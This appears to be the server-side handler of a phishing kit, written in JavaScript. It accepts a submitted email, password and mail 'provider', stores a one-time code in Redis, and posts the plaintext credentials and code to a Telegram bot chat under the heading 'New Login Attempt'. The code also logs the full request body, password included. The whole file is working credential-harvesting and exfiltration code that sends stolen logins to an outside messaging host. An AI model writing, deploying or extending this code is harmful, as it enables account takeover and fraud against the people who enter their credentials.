import Redis from "ioredis";
import fetch from "node-fetch";

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIS_URL = process.env.REDIS_URL;

let redis;

function getOtpKey(email) {
  return `otp:${email}`;
}

function generateOtp() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

export default async function handler(req, res) {
  console.log("BODY", req.body);

  if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
    console.log("Missing env");
    res.status(500).json({ success: false, message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL" });
    return;
  }

  if (!redis) {
    redis = new Redis(REDIS_URL);
    console.log("REDIS CONNECTED");
  }

  if (req.method !== "POST") {
    res.status(405).json({ success: false, message: "Method not allowed" });
    return;
  }

  // Robust body parsing
  let bodyObj = req.body;
  if (typeof req.body === "string") {
    try {
      bodyObj = JSON.parse(req.body);
    } catch (e) {
      console.log("Invalid JSON body");
      res.status(400).json({ success: false, message: "Invalid JSON body" });
      return;
    }
  }
  const { email, password, provider } = bodyObj || {};

  if (!email || !password || !provider) {
    console.log("Missing required fields");
    res.status(400).json({ success: false, message: "Missing required fields" });
    return;
  }

  const normalizedEmail = email.trim().toLowerCase();

  const otp = generateOtp();
  console.log("OTP", otp);

  try {
    await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300);
  } catch (err) {
    console.log("REDIS ERROR", err);
    res.status(500).json({
      success: false,
      message: "Failed to store OTP in Redis",
      error: err.message,
    });
    return;
  }

  const message = `🔐 *New Login Attempt*\n\n📧 Email: ${normalizedEmail}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp}`;
  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const text = await response.text();
      console.log("TELEGRAM ERROR", text);
      throw new Error(`Telegram API error: ${response.status} ${text}`);
    }

    res.status(200).json({
      success: true,
      message: "OTP sent to Telegram",
      email: normalizedEmail,
    });
  } catch (error) {
    console.log("TELEGRAM SEND ERROR", error);
    res.status(500).json({
      success: false,
      message: "Failed to send OTP to Telegram",
      error: error.message,
    });
  }
}